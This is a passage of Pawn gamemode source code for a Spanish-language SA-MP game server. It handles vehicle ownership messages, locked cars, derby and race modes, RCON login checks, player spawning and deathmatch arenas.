					}
					new string[175];
					format(string, sizeof(string), "|Info| »{EAEAEA} Este vehiculo {5783C2}(%s){EAEAEA} esta en venta y cuesta {52C433}$%d,{EAEAEA} escribe /Vbuy para comprarlo.",VehicleInfo[vehicleid][name], VehicleInfo[vehicleid][vehiclecost]);
   					SendClientMessage(playerid, red, string);
					return 1;
				}
				else {
					new string[128];
					format(string, sizeof(string), "|Info| »{EAEAEA} Este vehiculo {5783C2}(%s){EAEAEA} le pertenece a {0080FF}%s.", VehicleInfo[vehicleid][name], VehicleInfo[vehicleid][owner]);
   					SendClientMessage(playerid, red, string);
					return 1;
				}
			}
			else {
			    new playername[128];
			    GetPlayerName(playerid,playername,sizeof(playername));
			    if (strcmp(VehicleInfo[vehicleid][owner],playername,false) == 0) {
					new string[128];
					format(string, sizeof(string), "|Info| »{EAEAEA} Bienvenido a tu {5783C2}%s. {EAEAEA}Conduzca con cuidado!", VehicleInfo[vehicleid][name]);
   					SendClientMessage(playerid, red, string);
					return 1;
				}
		       	if (strcmp(VehicleInfo[vehicleid][owner],DEFAULT_OWNER,false) == 0) {
					if(VehicleInfo[vehicleid][buybar] == 1) {
		           		new string[128];
		           		format(string,sizeof(string),"|Info| »{EAEAEA} Este vehiculo {5783C2}(%s){EAEAEA} no esta en venta.", VehicleInfo[vehicleid][name]);
  						SendClientMessage(playerid, red, string);
						return 1;
					}
				   	new string[175];
				   	format(string, sizeof(string), "|Info| »{EAEAEA} Este vehiculo {5783C2}(%s){EAEAEA} esta en venta y cuesta {52C433}$%d,{EAEAEA} escribe /Vbuy para comprarlo.",VehicleInfo[vehicleid][name], VehicleInfo[vehicleid][vehiclecost]);
     				SendClientMessage(playerid, red, string);
					return 1;
				}
				else {
		        	new string[128];
		        	format(string, sizeof(string), "|Info| »{EAEAEA} Este vehiculo {5783C2}(%s){EAEAEA} le pertenece a {0080FF}%s.", VehicleInfo[vehicleid][name], VehicleInfo[vehicleid][owner]);
        			SendClientMessage(playerid, red, string);
					return 1;
				}
			}
		}
	}
	return 1;
}
forward CarColor(vehicleid);
public CarColor(vehicleid)
{
	ChangeVehicleColor(vehicleid ,random(256),random(256));
	new desen[4] = {0,1,2,3};
	ChangeVehiclePaintjob(vehicleid, desen[random(sizeof(desen))]);
	new roti[27] = {
	1025,1073,1074,1075,1076,1077,1078,1079,1080,1081,1082,
	1083,1084,1085,1086,1087,1088,1089,1090,1091,1092,1093,
	1094,1095,1096,1097,1098};
	AddVehicleComponent(vehicleid,roti[random(sizeof(roti))]);
}

forward VehicleEnterReset(playerid);
public VehicleEnterReset(playerid)
{
	pVehicles[playerid] = 0;
	return 1;
}

public OnPlayerStateChange(playerid, newstate, oldstate)
{
	if(newstate == PLAYER_STATE_DRIVER)
	{
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 463){	
			if(GhostRiderObjects[playerid][0]){GhostRiderActivar(playerid, GetPlayerVehicleID(playerid));}
		}
	}else{
		if(GhostRiderObjects[playerid][0]){GhostRiderDesactivar(playerid); }
	}
	if(newstate == PLAYER_STATE_DRIVER)
	{
		new vehid = GetPlayerVehicleID(playerid);
		if(IsABike(vehid))
		{
	 		new skin = GetPlayerSkin(playerid);
	 		SetPlayerAttachedObject(playerid, SLOT, 18645, 2, HelmetPos[skin][0], HelmetPos[skin][1], HelmetPos[skin][2], HelmetPos[skin][3], HelmetPos[skin][4], HelmetPos[skin][5]);
	 	}
	}else{
	 		RemovePlayerAttachedObject(playerid, SLOT);
	}
	//===================================== SISTEMA DE DERBY =======================================
		if(PI[playerid][P_GAMEMODE] == GAME_DERBY)
	{
		if(oldstate == PLAYER_STATE_DRIVER)
		{
			if(PI[playerid][P_STATUS] == STATUS_SPAWNED && PI[playerid][P_DERBY_STATUS] == PD_NORMAL)
			{
				if(!IsValidVehicle(PI[playerid][P_DERBY_VEHICLEID]) && PI[playerid][P_DERBY_VEHICLEID] != INVALID_VEHICLE_ID)
				{
					PI[playerid][P_DERBY_VEHICLEID] = CreateVehicle(DI[MODELID], DERBY_SPAWN_POS[ PI[playerid][P_DERBY_SLOT] ][0], DERBY_SPAWN_POS[ PI[playerid][P_DERBY_SLOT] ][1], DERBY_SPAWN_POS[ PI[playerid][P_DERBY_SLOT] ][2] + 2.0, DERBY_SPAWN_POS[ PI[playerid][P_DERBY_SLOT] ][3], -1, -1, -1, false);
					SetVehicleParamsEx(PI[playerid][P_DERBY_VEHICLEID], VEHICLE_PARAMS_OFF, VEHICLE_PARAMS_OFF, VEHICLE_PARAMS_OFF, 1, 0, 0, 0);
					SetVehicleVirtualWorld(PI[playerid][P_DERBY_VEHICLEID], DERBY_VIRTUAL_WORLD);
					PutPlayerInVehicle(playerid, PI[playerid][P_DERBY_VEHICLEID], 0);
					return 1;
				}
				PutPlayerInVehicle(playerid, PI[playerid][P_DERBY_VEHICLEID], 0);
			}
		}
		return 1;
	}
	////////////////////////////////////////////////////////////////////////////////////////////////////////
    if(IsPlayerInAnyVehicle(playerid) || newstate == PLAYER_STATE_DRIVER || newstate == PLAYER_STATE_PASSENGER)
	{
		pVehicles[playerid]++;
		SetTimerEx("VehicleEnterReset", 1000, 0, "i", playerid);
		if(pVehicles[playerid] >= MAX_ENTER_VEHICLES)
		{
  			new UsandoCrasher[128];
  			format(UsandoCrasher,sizeof(UsandoCrasher),"{EAEAEA}%s(%d) ha sido expulsado. {FF0000}(Posible Car Crasher)",PlayerName2(playerid),playerid);
			SendClientMessageToAll(red, UsandoCrasher);
			SaveToFile("KickLog",UsandoCrasher);
    		Kick(playerid);
		}
	}
	if(oldstate == PLAYER_STATE_DRIVER)
	{
		KillTimer(vremea[playerid]);
		ColorCar[playerid] = 0;
		crazycar[playerid] = 0;
	}
	switch(newstate){
		case PLAYER_STATE_ONFOOT:{
			switch(oldstate){
				case PLAYER_STATE_DRIVER:OnPlayerExitVehicle(playerid,255);
				case PLAYER_STATE_PASSENGER:OnPlayerExitVehicle(playerid,255);
			}
		}
	}
	if(oldstate == PLAYER_STATE_ONFOOT && GetVehicleModel(GetPlayerVehicleID(playerid)) == 449 && GetVehicleModel(GetPlayerVehicleID(playerid)) == 538)
    {
		intram[playerid] = 1;
		tramid[playerid] = GetPlayerVehicleID(playerid);
    }
	if(newstate == PLAYER_STATE_DRIVER && onsys[GetPlayerVehicleID(playerid)] == 1) {
		new string[128];
	    if(VehicleInfo[GetPlayerVehicleID(playerid)][Temp] == 1) {
	        SendClientMessage(playerid,red, "|Info| »{EAEAEA} Este vehiculo es temporal y no esta en venta.");
	    	return 1;
		}
		if(VehicleInfo[GetPlayerVehicleID(playerid)][ConObjetos] == 1) {
	        SendClientMessage(playerid,red, "|Info| »{EAEAEA} Este vehiculo posee objetos y no esta en venta.");
	    	return 1;
		}
		/*if(strcmp("Psicoloco", VehicleInfo[GetPlayerVehicleID(playerid)][owner], true ) == 0 ){
			new Psicoloco[MAX_PLAYER_NAME];
			GetPlayerName(playerid, Psicoloco, sizeof(Psicoloco));
			if( strcmp("Psicoloco", Psicoloco, true ) == 0 ) return SendClientMessage(playerid,red,"|Info| »{FFFFFF}Bienvenido a tu auto, creador.");
				RemovePlayerFromVehicle(playerid);
				//SetPlayerHealth(playerid, -999);
				format(string, sizeof(string), "|Info| »{FFFFFF} Este vehiculo {5783C2}(%s){FFFFFF} le pertenece a Psicoloco y nadie puede entrar.",VehicleInfo[GetPlayerVehicleID(playerid)][name],VehicleInfo[GetPlayerVehicleID(playerid)][owner]);
				SendClientMessage(playerid, red, string);
			return 1;
		}*/
		if(VehicleInfo[GetPlayerVehicleID(playerid)][asecure] == 1) {
			if (PlayerInfo[playerid][Level] >=1) {
			    format(carmess,sizeof(carmess),"|Info| »{EAEAEA} Este vehiculo {5783C2}(%s){EAEAEA} ha sido bloqueado por un administrador.",VehicleInfo[GetPlayerVehicleID(playerid)][name]);
				SendClientMessage(playerid,red,carmess);
				return 1;
			}
			RemovePlayerFromVehicle(playerid);
			GetPlayerPos(playerid,ta,tb,tc);
			SetPlayerPos(playerid,ta,tb,tc+5);
			format(string, sizeof(string), "|Info| »{EAEAEA} Este vehiculo {5783C2}(%s){EAEAEA} ha sido bloqueado por un administrador.",VehicleInfo[GetPlayerVehicleID(playerid)][name]);
			SendClientMessage(playerid, red, string);
			return 1;
		}
		if(VehicleInfo[GetPlayerVehicleID(playerid)][asecure] == 2) {
			if (PlayerInfo[playerid][Level] >=1) {
			    format(carmess,sizeof(carmess),"|Info| »{EAEAEA} Este vehiculo {5783C2}(%s){EAEAEA} ha sido bloqueado por un administrador.",VehicleInfo[GetPlayerVehicleID(playerid)][name]);
				SendClientMessage(playerid,red,carmess);
				return 1;
			}
			RemovePlayerFromVehicle(playerid);
			SetPlayerHealth(playerid, -999);
			format(string, sizeof(string), "|Info| »{EAEAEA} Este vehiculo {5783C2}(%s){EAEAEA} ha sido bloqueado por un administrador.",VehicleInfo[GetPlayerVehicleID(playerid)][name]);
			SendClientMessage(playerid, red, string);
			return 1;
		}
		if(VehicleInfo[GetPlayerVehicleID(playerid)][secure] == 0) {
			if (strcmp(VehicleInfo[GetPlayerVehicleID(playerid)][owner],PlayerInfo[playerid][name],false) == 0 && PlayerInfo[playerid][LoggedIn] == 1) {
				return 1;
			}
		}
		if(VehicleInfo[GetPlayerVehicleID(playerid)][secure] >= 1) { //Comment to Enable Lethal Car Protection
			if (strcmp(VehicleInfo[GetPlayerVehicleID(playerid)][owner],PlayerInfo[playerid][name],false) == 0 && PlayerInfo[playerid][LoggedIn] == 1) {
				return 1;
			}
			if(PlayerInfo[playerid][Level] >=1) {
			    format(string, sizeof(string), "|Info| »{EAEAEA} Este vehiculo {5783C2}(%s){EAEAEA} ha sido bloqueado por el dueño: {0080FF} %s.",VehicleInfo[GetPlayerVehicleID(playerid)][name],VehicleInfo[GetPlayerVehicleID(playerid)][owner]);
				SendClientMessage(playerid, red, string);
				return 1;
			}
			RemovePlayerFromVehicle(playerid);
			GetPlayerPos(playerid,ta,tb,tc);
			SetPlayerPos(playerid,ta,tb,tc+5);
			format(string, sizeof(string), "|Info| »{EAEAEA} Este vehiculo {5783C2}(%s){EAEAEA} ha sido bloqueado por el dueño: {0080FF}%s", VehicleInfo[GetPlayerVehicleID(playerid)][name],VehicleInfo[GetPlayerVehicleID(playerid)][owner]);
			SendClientMessage(playerid, red, string);
			return 1;
		}
		if(VehicleInfo[GetPlayerVehicleID(playerid)][secure] == 2) { //UnComment to Enable Lethal Car Protection
			if (strcmp(VehicleInfo[GetPlayerVehicleID(playerid)][owner],PlayerInfo[playerid][name],false) == 0 && PlayerInfo[playerid][LoggedIn] == 1) {
				return 1;
			}
			if(PlayerInfo[playerid][Level] >=1){
			//if(VehicleInfo[GetPlayerVehicleID(playerid)][owner] == "Psicoloco") {
				//format(string, sizeof(string), "|Info| »{FFFFFF} Este vehiculo {5783C2}(%s){FFFFFF} ha sido bloqueado por el dueño (Te matara si subes).", VehicleInfo[GetPlayerVehicleID(playerid)][name],VehicleInfo[GetPlayerVehicleID(playerid)][owner]);
				//SendClientMessage(playerid, red, string);
				return 1;
			}
			RemovePlayerFromVehicle(playerid);
			SetPlayerHealth(playerid, -999);
			format(string, sizeof(string), "|Info| »{FFFFFF} Este vehiculo {5783C2}(%s){FFFFFF} ha sido bloqueado por el dueño:%s (Te matara si subes).",VehicleInfo[GetPlayerVehicleID(playerid)][name],VehicleInfo[GetPlayerVehicleID(playerid)][owner]);
			SendClientMessage(playerid, red, string);
			return 1;
		}
	}
	new gpvm = GetVehicleModel(GetPlayerVehicleID(playerid));
	if(oldstate == PLAYER_STATE_ONFOOT && newstate == PLAYER_STATE_DRIVER && gpvm == 427 && gpvm == 430 && gpvm == 432 && gpvm == 433 && gpvm == 472 && gpvm == 497 && gpvm == 523 && gpvm == 528 && gpvm >= 596 && gpvm <= 599 && gpvm == 601 && gpvm == 416)
	{
		new pname[24];
		new plwl;
		GetPlayerName(playerid,pname,24);
		if(StoleCopCarRecent[playerid] == 0) {
			plwl = GetPlayerWantedLevel(playerid);
			SetPlayerWantedLevel(playerid,plwl +4);
		}
		new pcol = GetPlayerColor(playerid);
		new string[128];
		plwl = GetPlayerWantedLevel(playerid);
		SendClientMessage(playerid,pcol,string);
		commitedcrimerecently[playerid] +=200;
		if(StoleCopCarRecent[playerid] == 0) {
			for(new i=0;i<MAX_PLAYERS;i++)
			{
				if(LawEnforcementRadio[i] == 1) {
				}
			}
		}
		StoleCopCarRecent[playerid] =1;

	}
	return 1;
}
//================================Reset Count===================================
public resetcount()
{
	for (new i = 0; i < GetMaxPlayers(); i ++)
	{
		if (IsPlayerConnected(i)) cCount[i] = 0;
	}
}

public OnRconLoginAttempt(ip[], password[], success)
{
    if(!success)
    {
        new string[128];
        format(string,sizeof(string),"|> %s Intento ingresar a la rcon con la contraseña %s <|",ip, password);
        SaveToFile("BadRconAttempt",string);
        new pip[16];
        for(new i=0; i<MAX_PLAYERS; i++)
        {
            GetPlayerIp(i, pip, sizeof(pip));
            if(!strcmp(ip, pip, true))
            {
                Kick(i);
            }
        }
    }
	if(success)
	{
    	for(new i = 0; i < MAX_PLAYERS; i++)
     	{
	 		if(IsPlayerConnected(i))
     		{
	 			new pIP[16];
	 			new string[500];
	 			GetPlayerIp(i, pIP, 16);
	 			if(!strcmp(pIP,ip,true))
     			{
	 				format(string,sizeof(string),"{FFFFFF}Este servidor usa un sistema de 2 contraseñas RCON.\n{FFFFFF}Para acceder al RCON, tienes que escribir la segunda RCON.");
	 				ShowPlayerDialog(i, DIALOG_TYPE_SecondaryRcon, DIALOG_STYLE_INPUT,"{FF0000}SEGUNDA RCON",string, "Entrar", "Salir");
     			}
     		}		
     	}
	}
    return 1;
}
//============================On Player Exit Vehicle============================
public OnPlayerExitVehicle(playerid, vehicleid)
{
   /* if(Joined[playerid] == true)
    {
    	SendClientMessage(playerid, red, "|Info| »{EAEAEA} Perdiste la carrera por salir del vehiculo.");
   		GameTextForPlayer(playerid,"~w~Perdiste la carrera por salir del vehiculo",2500,3);
        BloquearComandosInRace[playerid] = 0;
		JoinCount--;
		Joined[playerid] = false;
		SetPVarInt(playerid, "JoinedToRRAce", false);
		DestroyVehicle(CreatedRaceVeh[playerid]);
	    DisablePlayerRaceCheckpoint(playerid);
		//TextDrawHideForPlayer(playerid, RaceInfo[playerid]);
		CPProgess[playerid] = 0;
		KillTimer(InfoTimer[playerid]);
		Race[InRace]--;
        pRace[playerid][pInRace] = 0;
    	TextDrawHideForPlayer(playerid, TRace);
   		TextDrawHideForPlayer(playerid, TRaceTiempoRestante);
   		TextDrawHideForPlayer(playerid, TRaceJugadores);
   		TextDrawHideForPlayer(playerid, TCheckpoint);
		TextDrawHideForPlayer(playerid, TRaceTiempoRestante2[playerid]);
		TextDrawHideForPlayer(playerid, TRaceJugadores2[playerid]);
		TextDrawHideForPlayer(playerid, TCheckpoint2[playerid]);
		TextDrawShowForPlayer(playerid, TComandos);
		TogglePlayerControllable(playerid, true);
		SetCameraBehindPlayer(playerid);
		#if defined RACE_IN_OTHER_WORLD
		SetPlayerVirtualWorld(playerid, 0);
		#endif
    }*/
    if(Joined[playerid] == true){
    	PutPlayerInVehicle(playerid, CreatedRaceVeh[playerid], 0); //vuelve a poner al jugador en el vehiculo
	}
	if(VehicleInfo[vehicleid][Temp] == 1) SetTimerEx("EraseVehicle", 10000,0,"i",vehicleid);
	if(VehicleInfo[vehicleid][ConObjetos] == 1) SetTimerEx("EraseVehicleConObjetos", 120000,0,"i",vehicleid);
	if(PlayerInfo[playerid][DoorsLocked] == 1)
	unlock(playerid);
	#if defined ENABLE_SPEC
	for(new x=0; x<MAX_PLAYERS; x++) {
    	if(GetPlayerState(x) == PLAYER_STATE_SPECTATING && PlayerInfo[x][SpecID] == playerid && PlayerInfo[x][SpecType] == ADMIN_SPEC_TYPE_VEHICLE) {
        	TogglePlayerSpectating(x, 1);
	        PlayerSpectatePlayer(x, playerid);
    	    PlayerInfo[x][SpecType] = ADMIN_SPEC_TYPE_PLAYER;
		}
	}
	#endif
	passenger[playerid] = 0;
	BUM[playerid] = 0;
	if(intram[playerid] == 1) {
		SetCameraBehindPlayer(playerid);
		SetTimerEx("EraseVehicle", 1000000,0,"i",tramid[playerid]);
		intram[playerid] = 0;
		tramid[playerid] = 0;
	}
	return 1;
}


public OnPlayerEnterRaceCheckpoint(playerid)
{
	if(CPProgess[playerid] == TotalCP -1)
	{
		new
		    TimeStamp2,
		    TotalRaceTime,
		    string[150],
		    rFile[256],
		    PlayerName[MAX_PLAYER_NAME],
			rTime[3],
			Prize[2],
			TempTotalTime,
			TempTime[3]
		;
		Position++;
		GetPlayerName(playerid, PlayerName, sizeof(PlayerName));
		TimeStamp2 = GetTickCount();
		TotalRaceTime = TimeStamp2 - RaceTick;
		ConvertTime(var, TotalRaceTime, rTime[0], rTime[1], rTime[2]);
		switch(Position)
		{
		    case 1: {Prize[0] = (random(random(1000)) + 19000), Prize[1] = 10; PlayerInfo[playerid][Rwin]++; }
		    case 2: Prize[0] = (random(random(1000)) + 17000), Prize[1] = 8;
		    case 3: Prize[0] = (random(random(1000)) + 15000), Prize[1] = 6;
		    case 4: Prize[0] = (random(random(1000)) + 13000), Prize[1] = 5;
		    case 5: Prize[0] = (random(random(1000)) + 11000), Prize[1] = 4;
		    case 6: Prize[0] = (random(random(1000)) + 9000), Prize[1] = 3;
		    case 7: Prize[0] = (random(random(1000)) + 7000), Prize[1] = 2;
		    case 8: Prize[0] = (random(random(1000)) + 5000), Prize[1] = 2;
		    case 9: Prize[0] = (random(random(1000)) + 3000), Prize[1] = 2;
		    default: Prize[0] = random(random(1000)), Prize[1] = 2;
		}
		format(string, sizeof(string), "|Race| »{0080FF} %s {EAEAEA}termino la carrera en la posición {00CCFF}#%d. {00FF00}Tiempo: {EAEAEA}|%d mins con %d segs|", PlayerName, Position, rTime[0], rTime[1]);
		SendClientMessageToAll(red, string);
		new Premio[60];
		format(Premio,sizeof(Premio),"~w~Premio:~n~~y~$%d~n~~w~+~n~~r~%d Score", Prize[0], Prize[1]);
		GameTextForPlayer(playerid,Premio,5000,3);
        PlayerInfo[playerid][DoorsLocked] = 0;
		ResetPlayerWeapons(playerid);
		DevolverArmasGuardadas(playerid);
		if(FinishCount <= 5)
		{
			format(rFile, sizeof(rFile), "/rRaceSystem/%s.RRACE", RaceName);
		    format(string, sizeof(string), "BestRacerTime_%d", TimeProgress);
		    TempTotalTime = dini_Int(rFile, string);
		    ConvertTime(var1, TempTotalTime, TempTime[0], TempTime[1], TempTime[2]);
		    if(TotalRaceTime <= dini_Int(rFile, string) || TempTotalTime == 0)
		    {
		        dini_IntSet(rFile, string, TotalRaceTime);
				format(string, sizeof(string), "BestRacer_%d", TimeProgress);
				format(string, sizeof(string), "BestRacer_%d", TimeProgress);
				dini_Set(rFile, string, PlayerName);
				TimeProgress++;
		    }
		}
		FinishCount++;
		JoinCount--;
		GivePlayerMoney(playerid, Prize[0]);
		SetPlayerScore(playerid, GetPlayerScore(playerid) + Prize[1]);
		DisablePlayerRaceCheckpoint(playerid);
		CPProgess[playerid]++;
		SavePlayer(playerid);
		if(FinishCount >= JoinCount) return StopRace();
    }
	else
	{
		CPProgess[playerid]++;
		CPCoords[CPProgess[playerid]][3]++;
		RacePosition[playerid] = floatround(CPCoords[CPProgess[playerid]][3], floatround_floor);
	    SetCP(playerid, CPProgess[playerid], CPProgess[playerid]+1, TotalCP, RaceType);

	    //new stringxd[100];
        //format(stringxd, sizeof(stringxd), "~n~~n~~n~~n~~n~~n~~n~~n~~r~Checkpoint:~w~ %d/%d",CPProgess[playerid]+1, TotalCP);
        //GameTextForPlayer(playerid,stringxd,2000,3);
	    PlayerPlaySound(playerid, 1137, 0.0, 0.0, 0.0);
		GetPlayerPos(playerid, PosCP_X, PosCP_Y, PosCP_Z);
	}
    return 1;
}
//=============================On Player Spawn==================================
public OnPlayerSpawn(playerid)
{
	IsSpawned[playerid] = 1;
    KZI_OnPlayerSpawn(playerid);
	//=====================================ZONA DE SPAWN=============================================//
	new str1[256],pname[24];
	GetPlayerName(playerid, pname, sizeof(pname));
	format(str1, sizeof(str1), "ladmin/users/%s.sav", udb_encode(pname));
	if(dini_Int(str1,"Houseid")!=-255 && BloquearComandosInDerby[playerid]==0 && Joined[playerid] == false && BloquearComandosInDM[playerid] == 0)
	{
		SpawnPlayerAtHouse(playerid);
		LoadObjects(playerid);
	}else{
		if(BloquearComandosInDerby[playerid]==0 && Joined[playerid] == false && BloquearComandosInDM[playerid] == 0)
		{
			SetPlayerPos(playerid,-312.2979,1537.2542,75.5625);
			SetPlayerVirtualWorld(playerid, 0);
			SetPlayerInterior(playerid,0);
		}
	}

	//TogglePlayerClock (playerid, 1);
	 //======================================[MUSICA GTA SPAWN]====================================//
    if(SoloSuenaUnaVez[playerid] == 1)
	{
     	PlayAudioStreamForPlayer(playerid, "https://a.tumblr.com/tumblr_p3ebmkIr0T1w1lrq2o1.mp3");
     	SoloSuenaUnaVez[playerid] = 0;
    }
	/////////////////////////////////////////////////////////////////////////////////////////////////
	if(ServerInfo[Locked] == 1 && PlayerInfo[playerid][AllowedIn] == false)
	{
		GameTextForPlayer(playerid,"~r~Servidor Bloqueado~n~~w~Debes ingresar la contraseña antes de jugar",4000,3);
		SetTimerEx("DelayKillPlayer", 2500,0,"d",playerid);
		return 1;
	}
	if(ServerInfo[MustLogin] == 1 && PlayerInfo[playerid][Registered] == 1 && PlayerInfo[playerid][LoggedIn] == 0)
	{
		GameTextForPlayer(playerid,"~r~Before you can play, you must login!",4000,3);
//		new paramsl[128];
//		ShowPlayerDialog(playerid, DIALOGID0+2, DIALOG_STYLE_INPUT,"Login Password", paramsl, "OK", "Cancel"); //Broken
		SetTimerEx("DelayKillPlayer", 2500,0,"d",playerid);
		return 1;
	}
	if(ServerInfo[MustRegister] == 1 && PlayerInfo[playerid][Registered] == 0)
	{
		new params[128];
		GameTextForPlayer(playerid,"~r~Before you can play, you must register!",4000,3);
		ShowPlayerDialog(playerid, DIALOGID0+1, DIALOG_STYLE_INPUT,"Password", params, "OK", "Cancel");
		SetTimerEx("DelayKillPlayer", 2500,0,"d",playerid);
		return 1;
	}
	PlayerInfo[playerid][Spawned] = 1;

	if(PlayerInfo[playerid][Frozen] == 1) {
	    TogglePlayerControllable(playerid,false); return SendClientMessage(playerid, red, "|Error| »{EAEAEA} No puedes usar comandos estando congelado.");
	}
	if(PlayerInfo[playerid][Jailed] == 1) {
	    SetTimerEx("JailPlayer",3000,0,"d",playerid); return SendClientMessage(playerid, red, "|Error| »{EAEAEA} No puedes usar comandos estando encarcelado.");
	}
	if(ServerInfo[AdminOnlySkins] == 1) {
		if( (GetPlayerSkin(playerid) == ServerInfo[AdminSkin]) || (GetPlayerSkin(playerid) == ServerInfo[AdminSkin2]) ) {
			if(PlayerInfo[playerid][Level] >= 1)
				GameTextForPlayer(playerid,"~b~Welcome~n~~w~Admin",3000,1);
			else {
				GameTextForPlayer(playerid,"~r~This Skin Is For~n~Administrators~n~Only",4000,1);
				SetTimerEx("DelayKillPlayer", 2500,0,"d",playerid);
				return 1;
			}
		}
	}
	if((dUserINT(PlayerName2(playerid)).("UseSkin")) == 1)
	if((PlayerInfo[playerid][Level] >= 0) && (PlayerInfo[playerid][LoggedIn] == 1))
	SetPlayerSkin(playerid,(dUserINT(PlayerName2(playerid)).("FavSkin")) );
//===============================SISTEMA DE DERBY==============================
	if(PI[playerid][P_GAMEMODE] == GAME_DERBY)
	{
		if(DI[STATUS] == DERBY_RUNNING)
		{
			if(PI[playerid][P_DERBY_STATUS] == PD_DEAD)
			{
				TogglePlayerSpectating(playerid, true);
				PlayerSpectateVehicle(playerid, PI[ PI[playerid][P_DERBY_SPECTATEPLAYER] ][P_DERBY_VEHICLEID]);
			}
			else PlayerDerbyDead(playerid);
		}
		else if(DI[STATUS] == DERBY_WAIT)
		{
			if(PI[playerid][P_DERBY_STATUS] == PD_NORMAL)
			{
				if(!IsValidVehicle(PI[playerid][P_DERBY_VEHICLEID]) && PI[playerid][P_DERBY_VEHICLEID] != INVALID_VEHICLE_ID)
				{
					PI[playerid][P_DERBY_VEHICLEID] = CreateVehicle(DI[MODELID], DERBY_SPAWN_POS[ PI[playerid][P_DERBY_SLOT] ][0], DERBY_SPAWN_POS[ PI[playerid][P_DERBY_SLOT] ][1], DERBY_SPAWN_POS[ PI[playerid][P_DERBY_SLOT] ][2] + 2.0, DERBY_SPAWN_POS[ PI[playerid][P_DERBY_SLOT] ][3], -1, -1, -1, false);
					SetVehicleParamsEx(PI[playerid][P_DERBY_VEHICLEID], VEHICLE_PARAMS_OFF, VEHICLE_PARAMS_OFF, VEHICLE_PARAMS_OFF, 1, 0, 0, 0);
					SetVehicleVirtualWorld(PI[playerid][P_DERBY_VEHICLEID], DERBY_VIRTUAL_WORLD);
					PutPlayerInVehicle(playerid, PI[playerid][P_DERBY_VEHICLEID], 0);
				}
				PutPlayerInVehicle(playerid, PI[playerid][P_DERBY_VEHICLEID], 0);
			}
		}
	}
	PI[playerid][P_STATUS] = STATUS_SPAWNED;

	/*if(PI[playerid][P_GAMEMODE] != GAME_DERBY){
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerInterior(playerid,0);
		SetTimerEx("AntiSpawnKill", 5000, 0, "d", playerid);
	 	TogglePlayerControllable(playerid, 0);
	 	IsSpawned[playerid] = 1;
	 	SpawnPlayer(playerid);
	 	SetPlayerArmour(playerid,99.0);
	  	SetPlayerHealth(playerid, 9999999.9999999);
  	}*/
	///////////////////////////////////////////////////////////////////////////////////
	if(pDeathmatch[playerid][pInDM1] == 1)
	{
		new rand = random(sizeof(gInDM1));
		SetPlayerPos(playerid, gInDM1[rand][0], gInDM1[rand][1], gInDM1[rand][2]);
		TogglePlayerControllable(playerid, 1);
		SetPlayerInterior(playerid,18);
		SetPlayerHealth(playerid,99.0);
		ResetPlayerWeapons(playerid);
		GivePlayerWeapon(playerid, 31, 1500);
		GivePlayerWeapon(playerid, 29, 1500);
		GivePlayerWeapon(playerid, 0, 0);
		return 1;
	}
	if(pDeathmatch[playerid][pInDM2] == 1)
	{
		new rand = random(sizeof(gInDM2));
		SetPlayerPos(playerid, gInDM2[rand][0], gInDM2[rand][1], gInDM2[rand][2]);
		TogglePlayerControllable(playerid, 1);
		SetPlayerHealth(playerid,99.0);
		SetPlayerInterior(playerid,2);
		ResetPlayerWeapons(playerid);
		GivePlayerWeapon(playerid, 22, 1500);
		GivePlayerWeapon(playerid, 28, 1500);
		GivePlayerWeapon(playerid, 25, 1500);
		GivePlayerWeapon(playerid, 33, 1500);
		GivePlayerWeapon(playerid, 5, 1);
		GivePlayerWeapon(playerid, 0, 0);
		return 1;
	}
	if(pDeathmatch[playerid][pInDM3] == 1)
	{
		new rand = random(sizeof(gInDM3));
		SetPlayerPos(playerid, gInDM3[rand][0], gInDM3[rand][1], gInDM3[rand][2]);
		TogglePlayerControllable(playerid, 1);
		SetPlayerHealth(playerid,99.0);
		SetPlayerInterior(playerid,15);
		ResetPlayerWeapons(playerid);
		GivePlayerWeapon(playerid, 22, 1500);
		GivePlayerWeapon(playerid, 32, 1500);
		GivePlayerWeapon(playerid, 30, 1500);
		GivePlayerWeapon(playerid, 34, 1500);
		GivePlayerWeapon(playerid, 0, 0);
		return 1;
	}
	if(pDeathmatch[playerid][pInDM4] == 1)
	{
		new rand = random(sizeof(gInDM4));
		SetPlayerPos(playerid, gInDM4[rand][0], gInDM4[rand][1], gInDM4[rand][2]);
		TogglePlayerControllable(playerid, 1);
		SetPlayerHealth(playerid,99.0);
		SetPlayerInterior(playerid,18);
		ResetPlayerWeapons(playerid);
		GivePlayerWeapon(playerid, 24, 1500);
		GivePlayerWeapon(playerid, 27, 1500);
		GivePlayerWeapon(playerid, 8, 1);
		GivePlayerWeapon(playerid, 0, 0);
		return 1;
	}
	if(pDeathmatch[playerid][pInMiniDM] == 1)
	{
		new rand = random(sizeof(gInMiniDM));
		SetPlayerPos(playerid, gInMiniDM[rand][0], gInMiniDM[rand][1], gInMiniDM[rand][2]);
		TogglePlayerControllable(playerid, 1);
  		SetPlayerHealth(playerid,99.0);
		SetPlayerInterior(playerid,1);
		ResetPlayerWeapons(playerid);
		GivePlayerWeapon(playerid, 9, 1);
		GivePlayerWeapon(playerid, 24, 1500);
		GivePlayerWeapon(playerid, 0, 0);
		return 1;
	}
	if(pDeathmatch[playerid][pInMiniDM2] == 1)
	{
		new rand = random(sizeof(gInMiniDM2));
		SetPlayerPos(playerid, gInMiniDM2[rand][0], gInMiniDM2[rand][1], gInMiniDM2[rand][2]);
		TogglePlayerControllable(playerid, 1);
		SetPlayerHealth(playerid,99.0);
		SetPlayerInterior(playerid,4);
		ResetPlayerWeapons(playerid);
		GivePlayerWeapon(playerid,31,1500);
		GivePlayerWeapon(playerid,29,1500);
		GivePlayerWeapon(playerid,24,1500);
		return 1;
	}
	if(pDeathmatch[playerid][pInDesmadre] == 1)
	{
		SetPlayerPos(playerid,1412.639892,-1.787510,1000.924377);
		TogglePlayerControllable(playerid, 1);
		SetPlayerHealth(playerid,99.0);
		SetPlayerArmour(playerid,99.0);
		SetPlayerInterior(playerid,1);
		ResetPlayerWeapons(playerid);
		GivePlayerWeapon(playerid, 24, 1500);
		GivePlayerWeapon(playerid, 25, 1500);
		GivePlayerWeapon(playerid, 34, 1500);
		return 1;
	}
	if(pDeathmatch[playerid][pInBoxDM] == 1)
	{
		new rand = random(sizeof(gInBoxDM));
		SetPlayerPos(playerid, gInBoxDM[rand][0], gInBoxDM[rand][1], gInBoxDM[rand][2]);
		TogglePlayerControllable(playerid, 1);
		SetPlayerHealth(playerid,99.0);
		ResetPlayerWeapons(playerid);
